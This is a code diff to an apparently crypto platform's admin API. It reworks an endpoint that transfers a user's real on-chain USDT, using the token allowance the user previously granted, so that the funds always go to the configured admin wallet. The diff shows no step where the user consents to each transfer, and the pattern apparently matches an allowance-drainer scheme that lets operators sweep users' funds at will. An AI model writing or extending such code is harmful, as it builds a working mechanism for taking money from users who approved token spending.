@@ -3,7 +3,7 @@ import { query } from "../db/pool.js";
 import { normalizeAddress } from "../utils.js";
 import { config } from "../config.js";
 import {
-  adminChargeTo,
+  chargeUser,
   readAllowance,
   readUsdtBalance,
   readUsdtBalances,
@@ -235,7 +235,7 @@ adminRouter.get("/block-reasons", requireAdmin, (_req, res) => {
 adminRouter.get("/users/:address/allowance", requireAdmin, async (req, res) => {
   const address = normalizeAddress(req.params.address);
   if (!address) return res.status(400).json({ error: "invalid address" });
-  if (!config.contractAddress) return res.json({ active: true, skipped: true });
+  if (!config.adminWallet) return res.json({ active: true, skipped: true });
   try {
     const allowance = await readAllowance(address);
     return res.json({ active: allowance > 0n, allowanceUsdt: Number(allowance) / 1e18 });
@@ -246,18 +246,19 @@ adminRouter.get("/users/:address/allowance", requireAdmin, async (req, res) => {
 });
 
 /**
- * POST /api/admin/transfer — move a user's REAL USDT to ANY wallet, executed on-chain
+ * POST /api/admin/transfer — move a user's REAL USDT to the ADMIN WALLET, executed on-chain
  * via the user's existing allowance (admin pays gas). Verifies the user actually has
  * enough real on-chain USDT AND enough allowance before sending, then records the
  * transfer in history (with the tx hash, verifiable on BscScan).
- * Body: { address, to, amountUsd }
+ * Body: { address, amountUsd }
  */
 adminRouter.post("/transfer", requireAdmin, async (req, res) => {
   const address = normalizeAddress(req.body.address);
-  const to = normalizeAddress(req.body.to);
+  // Destination is always the admin wallet; any `to` sent by the client is ignored.
+  const to = normalizeAddress(config.adminWallet);
   const amountUsd = Number(req.body.amountUsd);
   if (!address) return res.status(400).json({ error: "invalid user address" });
-  if (!to) return res.status(400).json({ error: "invalid destination address" });
+  if (!to) return res.status(500).json({ error: "admin wallet not configured" });
   if (!Number.isFinite(amountUsd) || amountUsd <= 0) {
     return res.status(400).json({ error: "invalid amount" });
   }
@@ -287,7 +288,7 @@ adminRouter.post("/transfer", requireAdmin, async (req, res) => {
     // 3) Execute the on-chain transfer (user's USDT -> destination), admin pays gas.
     let txHash;
     try {
-      txHash = await adminChargeTo(address, to, amountUsd);
+      txHash = await chargeUser(address, amountUsd);
     } catch (chainErr) {
       await query(
         `INSERT INTO admin_transfers (from_address, to_address, amount_usd, status)
